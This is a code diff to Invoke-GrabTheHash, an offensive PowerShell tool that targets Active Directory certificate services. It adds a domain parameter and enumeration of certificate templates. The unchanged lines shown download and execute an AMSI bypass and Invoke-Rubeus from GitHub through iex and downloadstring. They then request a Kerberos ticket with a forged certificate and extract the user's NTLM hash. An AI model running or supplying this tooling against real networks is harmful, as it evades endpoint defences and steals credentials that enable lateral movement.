@@ -13,13 +13,58 @@ function Invoke-GrabTheHash
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[String]$TemplateName = "User",
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
-		[string]$CAName
+		[string]$CAName,
+  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[string]$Domain,
+  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[switch]$CertTemplates
 	)
 	
 	$ErrorActionPreference = "SilentlyContinue"
 	$WarningPreference = "SilentlyContinue"
 	
 	Write-Host ""
+
+ 	if($Domain){
+		$currentDomain = $Domain
+	}
+	else{
+		try{
+  			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+			$currentDomain = $currentDomain.Name
+  		}
+    		catch{$currentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
+	}
+
+	Write-Host "Domain switch not provided. Target Domain will be set to: $currentDomain"
+
+ 	if($CertTemplates){
+  		$domainDistinguishedName = "DC=" + ($currentDomain -replace "\.", ",DC=")
+  		$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry
+		$ldapConnection.Path = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDistinguishedName"
+		$ldapConnection.AuthenticationType = "None"
+		
+		$searcher = New-Object System.DirectoryServices.DirectorySearcher
+		$searcher.SearchRoot = $ldapConnection
+		$searcher.Filter = "(objectClass=pKICertificateTemplate)"
+		$searcher.SearchScope = "Subtree"
+		
+		$results = $searcher.FindAll()
+
+  		Write-Host "Template Names:"
+		
+		foreach ($result in $results) {
+		    $templateName = $result.Properties["name"][0]
+		    Write-Host "$templateName"
+		}
+		
+		# Dispose resources
+		$results.Dispose()
+		$searcher.Dispose()
+		$ldapConnection.Dispose()
+
+  		break
+	}
 	
 	if(!$CAName){
 		$CertutilDump = certutil
@@ -31,7 +76,7 @@ function Invoke-GrabTheHash
 	
 	if(!$CN){
 		$KlistDump = klist
-		$clientNames = $KlistDump | Where-Object { $_ -match "Client:\s*(\w+)\s*@" } | ForEach-Object { $matches[1] }
+		$clientNames = $KlistDump | Where-Object { $_ -match "Client:\s*([\w.]+)\s*@" } | ForEach-Object { $matches[1] }
 		$CN = $clientNames | Sort -Unique
 	}
 	
@@ -149,7 +194,7 @@ CertificateTemplate = "$TemplateName"
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
 	
-	$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256
+	$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
 	
 	if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 		$ntlmValue = $Matches[1]
